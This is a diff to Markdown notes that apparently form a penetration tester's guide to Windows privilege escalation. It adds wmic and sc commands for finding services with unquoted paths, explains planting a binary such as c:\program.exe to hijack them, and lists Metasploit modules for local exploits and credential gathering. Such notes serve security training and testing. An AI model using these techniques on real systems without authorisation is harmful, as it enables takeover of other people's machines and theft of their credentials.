@@ -1,4 +1,4 @@
-# Privilege escalation windows
+# Privilege Escalation Windows
 
 We now have a low-privileges shell that we want to escalate into a privileged shell.
 
@@ -304,6 +304,37 @@ http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html
 
 ## Unquoted Service Paths
 
+### Find Services With Unquoted Paths
+
+```
+# Using WMIC
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+# Using sc
+sc query
+sc qc service name
+
+# Look for Binary_path_name and see if it is unquoted. 
+```
+
+If the path contains a space and is not quoted, the service is vulnerable.
+
+### Exploit It
+
+If the path to the binary is
+
+```
+c:\program files\something\program.exe
+```
+
+We can place a binary like this
+
+```
+c:\program.exe
+```
+
+When the program is restarted it will execute the binary **program.exe**, which we of course control. We can do this in any directory that has a space in its name. Not only program files.
+
 This attack is explained here:
 http://toshellandback.com/2015/11/24/ms-priv-esc/
 
@@ -365,34 +396,18 @@ vdmexploit.dll
 ```
 
 
-Most recommended article
-
-http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/
-http://www.fuzzysecurity.com/tutorials/16.html
-
-https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
-
-http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html
-
-https://github.com/gentilkiwi/mimikatz
-
-http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html
-
-https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be
-
-https://www.youtube.com/watch?v=PC_iMqiuIRQ
-
-http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
-
-https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
-
-http://pwnwiki.io/#!privesc/windows/index.md
-
 ## Using Metasploit
 
 So if you have a metasploit meterpreter session going you can run **getsystem**.
 
+### Unquoted Service Paths
+
+```
+exploit/windows/local/trusted_service_path
+```
+
 ### Post modules
+
 
 First you need to background the meterpreter shell and then you just run the post modules.
 You can also try some different post modules. 
@@ -402,7 +417,7 @@ use exploit/windows/local/service_permissions
 
 post/windows/gather/credentials/gpp
 
-exploit/windows/local/trusted_service_path
+
 
 run post/windows/gather/credential_collector 
 
@@ -422,5 +437,15 @@ run post/windows/gather/checkvm
 
 ## References
 
-http://www.fuzzysecurity.com/tutorials/16.html
 
+http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/
+http://www.fuzzysecurity.com/tutorials/16.html
+https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
+http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html
+https://github.com/gentilkiwi/mimikatz
+http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html
+https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be
+https://www.youtube.com/watch?v=PC_iMqiuIRQ
+http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
+https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
+http://pwnwiki.io/#!privesc/windows/index.md
